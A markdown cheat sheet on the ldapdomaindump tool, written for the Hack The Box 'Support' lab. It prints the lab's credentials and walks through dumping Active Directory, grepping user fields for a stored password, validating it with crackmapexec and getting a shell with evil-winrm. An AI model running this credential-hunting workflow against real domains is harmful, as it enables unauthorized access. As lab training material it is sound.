---
title: "ldapdomaindump"
description: "pip3 install ldapdomaindump"
category: active-directory
tags: ["active-directory"]
tools: ["Nmap", "NetExec", "BloodHound", "ldapsearch", "Evil-WinRM"]
difficulty: intermediate
updated: "2026-08-10"
source: "vault:ActiveDirectory/ldapdomaindump.md"
---
# Complete ldapdomaindump Cheat Sheet for HTB Support

**Target Information:**
- **Domain:** support.htb
- **Username:** ldap
- **Password:** nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
- **Full User Format:** support.htb\ldap or ldap@support.htb

***

## What is ldapdomaindump?

**ldapdomaindump** is a Python tool that performs comprehensive Active Directory enumeration via LDAP and outputs the results in **human-readable HTML files** and **JSON files** for further processing. It's essentially an automated LDAP enumeration tool that saves you from running dozens of individual ldapsearch commands.

### Why Use ldapdomaindump?

| Feature | Benefit |
|---------|---------|
| **Automated Enumeration** | Runs multiple LDAP queries automatically |
| **HTML Reports** | Easy-to-read tables you can view in a browser |
| **JSON Output** | Machine-readable format for scripting/parsing |
| **Comprehensive** | Dumps users, groups, computers, trusts, policies in one go |
| **No BloodHound Needed** | Lightweight alternative when you just need basic enumeration |
| **Grep-able JSON** | The JSON files let you search for passwords in `info` fields |

***

## Installation

```bash
# Install via pip (recommended)
pip3 install ldapdomaindump

# Install from GitHub (latest version)
git clone https://github.com/dirkjanm/ldapdomaindump.git
cd ldapdomaindump
pip3 install .

# On Kali Linux (usually pre-installed)
apt install ldapdomaindump

# Verify installation
ldapdomaindump --help
```

***

## Basic Command Syntax

```bash
ldapdomaindump [options] HOSTNAME
```

The tool requires:
1. **Authentication credentials** (`-u` and `-p`)
2. **Target hostname** (domain name or IP address)

***

## Essential Commands for HTB Support

### Standard Enumeration (Recommended)

```bash
# Basic enumeration with output directory
ldapdomaindump -u support.htb\\ldap \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  support.htb \
  -o ldap_output
```

**What this does:**
- `-u support.htb\\ldap` - Authenticates as the ldap user in the support.htb domain (note the double backslash)
- `-p 'password'` - Provides the password (single quotes protect special characters)
- `support.htb` - The target domain/hostname
- `-o ldap_output` - Creates a directory called `ldap_output` and saves all results there

### Using IP Address Instead

```bash
# Connect via IP (useful if DNS isn't working)
ldapdomaindump -u support.htb\\ldap \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  10.10.11.174 \
  -o ldap_output
```

### Alternative Username Formats

```bash
# Format 1: DOMAIN\username (requires double backslash in bash)
ldapdomaindump -u support.htb\\ldap \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  support.htb \
  -o ldap_output

# Format 2: username@domain (UPN format)
ldapdomaindump -u ldap@support.htb \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  support.htb \
  -o ldap_output

# Format 3: Just username (less reliable)
ldapdomaindump -u ldap \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  support.htb \
  -o ldap_output
```

***

## Output Files Generated

After running ldapdomaindump, you'll get **6 HTML files** and **6 JSON files**:

| File Name | Description | What to Look For |
|-----------|-------------|------------------|
| **domain_users.html/json** | All user accounts in the domain | Passwords in `info`/`description` fields, service accounts, privileged users |
| **domain_groups.html/json** | All security groups | Domain Admins, Enterprise Admins, Remote Management Users |
| **domain_computers.html/json** | All computer objects | Domain controllers, servers, workstations, OS versions |
| **domain_policy.html/json** | Domain password policy | Min password length, lockout policy, password age |
| **domain_trusts.html/json** | Trust relationships | External domains, trust direction and type |
| **domain_users_by_group.html/json** | Users organized by group membership | Quick view of who's in what group |

### Example Output Directory

```bash
ldap_output/
├── domain_computers.html
├── domain_computers.json
├── domain_groups.html
├── domain_groups.json
├── domain_policy.html
├── domain_policy.json
├── domain_trusts.html
├── domain_trusts.json
├── domain_users.html
├── domain_users.json
├── domain_users_by_group.html
└── domain_users_by_group.json
```

***

## Analyzing the Output

### Critical Information to Check

#### 1. **domain_users.json** - Hunt for Passwords!

```bash
# Search for passwords in info fields (HTB Support specific!)
grep -i "info" ldap_output/domain_users.json

# Search for description fields
grep -i "description" ldap_output/domain_users.json

# Search for specific user
grep -A 20 '"name": "support"' ldap_output/domain_users.json

# Look for service accounts
grep -i "service\|svc\|admin" ldap_output/domain_users.json
```

**In HTB Support, this reveals:**
```json
{
  "name": "support",
  "info": "Ironside47pleasure40Watchful",
  "memberOf": [
    "CN=Shared Support Accounts,CN=Users,DC=support,DC=htb",
    "CN=Remote Management Users,CN=Builtin,DC=support,DC=htb"
  ]
}
```

#### 2. **domain_groups.json** - Privileged Groups

```bash
# Find Domain Admins
grep -A 10 "Domain Admins" ldap_output/domain_groups.json

# Find Remote Management Users (WinRM access!)
grep -A 10 "Remote Management Users" ldap_output/domain_groups.json

# Find all admin groups
grep -i "admin" ldap_output/domain_groups.json
```

#### 3. **domain_computers.json** - Target Systems

```bash
# Find domain controllers
grep -i "SERVER\|DC" ldap_output/domain_computers.json

# Check operating systems
grep "operatingSystem" ldap_output/domain_computers.json
```

#### 4. **View HTML in Browser**

```bash
# Open in default browser (Linux)
firefox ldap_output/domain_users.html

# Python simple HTTP server to view all files
cd ldap_output
python3 -m http.server 8000
# Then browse to http://localhost:8000
```

***

## Advanced Usage

### Resolve All Objects (Slower but More Complete)

```bash
# Resolve all LDAP object references to names
ldapdomaindump -u support.htb\\ldap \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  support.htb \
  -o ldap_output \
  -r
```

**What `-r` does:** Resolves SIDs and DNs to readable names, but takes longer to complete.

### Use LDAPS (SSL/TLS)

```bash
# Connect via LDAPS on port 636
ldapdomaindump -u support.htb\\ldap \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  support.htb \
  -o ldap_output \
  -l ldaps://support.htb:636
```

### No HTML Output (JSON Only)

```bash
# Generate only JSON files (faster, no HTML rendering)
ldapdomaindump -u support.htb\\ldap \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  support.htb \
  -o ldap_output \
  --no-html
```

### No JSON Output (HTML Only)

```bash
# Generate only HTML files
ldapdomaindump -u support.htb\\ldap \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  support.htb \
  -o ldap_output \
  --no-json
```

***

## Complete Enumeration Workflow

### Step 1: Run ldapdomaindump

```bash
ldapdomaindump -u support.htb\\ldap \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  support.htb \
  -o ldap_output
```

**Expected Output:**
```
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

### Step 2: Check User Info Fields for Passwords

```bash
# Quick check for passwords in info fields
grep -i "info" ldap_output/domain_users.json | grep -v '""'

# More detailed search
jq '.[] | select(.info != "") | {name: .name, info: .info, memberOf: .memberOf}' ldap_output/domain_users.json
```

### Step 3: Identify Privileged Users

```bash
# Users in Remote Management Users group
jq '.[] | select(.memberOf[]? | contains("Remote Management Users")) | .name' ldap_output/domain_users.json

# Users with adminCount=1
grep -B 5 '"adminCount": 1' ldap_output/domain_users.json
```

### Step 4: View HTML Reports

```bash
# Start web server to view all reports
cd ldap_output
python3 -m http.server 8000
```

Then open your browser to:
- http://localhost:8000/domain_users.html
- http://localhost:8000/domain_groups.html
- http://localhost:8000/domain_computers.html

***

## Parsing JSON Output with jq

```bash
# Pretty print entire user list
jq '.' ldap_output/domain_users.json

# Get all usernames
jq '.[].name' ldap_output/domain_users.json

# Users with non-empty info fields
jq '.[] | select(.info != "") | {name: .name, info: .info}' ldap_output/domain_users.json

# Users with "admin" in their name
jq '.[] | select(.name | contains("admin"))' ldap_output/domain_users.json

# Get Domain Admins members
jq '.[] | select(.name == "Domain Admins") | .members' ldap_output/domain_groups.json

# Count total users
jq '. | length' ldap_output/domain_users.json

# Export usernames to file
jq -r '.[].name' ldap_output/domain_users.json > usernames.txt
```

***

## Common Use Cases

### Finding Credentials (HTB Support Scenario)

```bash
# 1. Run ldapdomaindump
ldapdomaindump -u support.htb\\ldap \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  support.htb \
  -o ldap_output

# 2. Search for passwords in info field
grep "info" ldap_output/domain_users.json | grep -v '""'

# 3. You'll find:
# "info": "Ironside47pleasure40Watchful"

# 4. Test the credentials
crackmapexec smb support.htb -u support -p 'Ironside47pleasure40Watchful'
```

### Building a Target List

```bash
# Extract all usernames
jq -r '.[].name' ldap_output/domain_users.json > users.txt

# Extract all computer names
jq -r '.[].name' ldap_output/domain_computers.json > computers.txt

# Extract users with descriptions (might contain passwords)
jq '.[] | select(.description != "") | {name: .name, description: .description}' ldap_output/domain_users.json
```

### Identifying High-Value Targets

```bash
# Domain Admins
jq '.[] | select(.name == "Domain Admins")' ldap_output/domain_groups.json

# Enterprise Admins
jq '.[] | select(.name == "Enterprise Admins")' ldap_output/domain_groups.json

# Users with SPNs (Kerberoastable)
jq '.[] | select(.servicePrincipalName != null) | {name: .name, spn: .servicePrincipalName}' ldap_output/domain_users.json
```

***

## Troubleshooting

### Error: "Could not connect to host"

```bash
# Check if LDAP port is open
nmap -p 389,636,3268,3269 support.htb

# Try with IP instead of hostname
ldapdomaindump -u support.htb\\ldap \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  10.10.11.174 \
  -o ldap_output

# Try LDAPS
ldapdomaindump -u support.htb\\ldap \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  support.htb \
  -o ldap_output \
  -l ldaps://support.htb
```

### Error: "Bind failed"

```bash
# Check username format
# Try different formats:

# Format 1: DOMAIN\user
ldapdomaindump -u support.htb\\ldap -p 'password' support.htb -o ldap_output

# Format 2: user@domain
ldapdomaindump -u ldap@support.htb -p 'password' support.htb -o ldap_output

# Verify credentials with crackmapexec
crackmapexec ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

### Password with Special Characters

```bash
# Always use single quotes to protect special characters
ldapdomaindump -u support.htb\\ldap \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  support.htb \
  -o ldap_output

# Alternatively, escape special characters
ldapdomaindump -u support.htb\\\\ldap \
  -p nvEfEK16\^1aM4\$e7AclUf8x\$tRWxPWO1%lmz \
  support.htb \
  -o ldap_output
```

***

## Converting to BloodHound Format

ldapdomaindump output can be converted to BloodHound-compatible JSON:

```bash
# Clone the converter tool
git clone https://github.com/blurbdust/ldd2bh.git
cd ldd2bh

# Convert ldapdomaindump output
python3 ldd2bh.py -d /path/to/ldap_output

# Import the generated JSON files into BloodHound
```

***

## Comparison with Other Tools

| Tool | Speed | Output Format | Use Case |
|------|-------|---------------|----------|
| **ldapdomaindump** | Medium | HTML + JSON | Quick human-readable enumeration |
| **BloodHound** | Slow | Neo4j Graph | Complex attack path analysis |
| **ldapsearch** | Fast | LDIF/Text | Specific targeted queries |
| **crackmapexec** | Fast | Terminal | Quick validation and spraying |
| **windapsearch** | Medium | Text | Python-based enumeration |

**When to use ldapdomaindump:**
- You want quick, comprehensive enumeration
- You prefer browsing HTML tables
- You need JSON for scripting
- You don't need complex graph analysis
- You're on a slow connection (BloodHound can be heavy)

***

## Complete Command Reference Table

| Flag | Long Form | Description | Example |
|------|-----------|-------------|---------|
| `-u` | `--user` | Username for authentication (DOMAIN\user or user@domain) | `-u support.htb\\ldap` |
| `-p` | `--password` | Password (use single quotes for special chars) | `-p 'password123'` |
| `-o` | `--outdir` | Output directory for results | `-o ldap_output` |
| `-l` | `--ldapurl` | Custom LDAP URL | `-l ldaps://dc.support.htb:636` |
| `-r` | `--resolve` | Resolve all LDAP references (slower but more complete) | `-r` |
| `-m` | `--minimal` | Minimal output, only essential attributes | `-m` |
| `-n` | `--dns-server` | Custom DNS server IP | `-n 10.10.11.174` |
| `-d` | `--debug` | Enable debug output | `-d` |
| `--no-html` | N/A | Don't generate HTML files (JSON only) | `--no-html` |
| `--no-json` | N/A | Don't generate JSON files (HTML only) | `--no-json` |
| `--no-grep` | N/A | Don't generate grep-able output | `--no-grep` |

***

## Quick Reference Commands

```bash
# Standard enumeration
ldapdomaindump -u support.htb\\ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' support.htb -o ldap_output

# With resolution (slower, more detail)
ldapdomaindump -u support.htb\\ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' support.htb -o ldap_output -r

# Via IP address
ldapdomaindump -u support.htb\\ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 10.10.11.174 -o ldap_output

# JSON only (faster)
ldapdomaindump -u support.htb\\ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' support.htb -o ldap_output --no-html

# LDAPS connection
ldapdomaindump -u support.htb\\ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' support.htb -o ldap_output -l ldaps://support.htb:636

# Hunt for passwords
grep -i "info\|description" ldap_output/domain_users.json | grep -v '""'

# View in browser
cd ldap_output && python3 -m http.server 8000
```

***

## Pro Tips for HTB Support

1. **The info field contains the password** - Always check `domain_users.json` for the `info` attribute
2. **Check group memberships** - Look for "Remote Management Users" to find WinRM-enabled accounts
3. **JSON is greppable** - Use `grep`, `jq`, or `cat` to search the JSON files
4. **HTML is browsable** - Open the HTML files in a browser for easier reading
5. **Compare with BloodHound** - Run both tools for comprehensive coverage
6. **Save your output** - Keep the output directory for reference throughout the engagement
7. **No creds needed first** - Always run anonymous ldapsearch for namingContexts before ldapdomaindump

## Complete HTB Support Attack Flow

```bash
# Step 1: Discover base DN (no auth)
ldapsearch -x -H ldap://support.htb -b "" -s base namingContexts

# Step 2: Run ldapdomaindump with initial creds
ldapdomaindump -u support.htb\\ldap \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  support.htb \
  -o ldap_output

# Step 3: Find password in info field
grep "info" ldap_output/domain_users.json | grep -v '""'
# Result: "info": "Ironside47pleasure40Watchful"

# Step 4: Verify new credentials
crackmapexec winrm support.htb -u support -p 'Ironside47pleasure40Watchful'

# Step 5: Get shell
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```
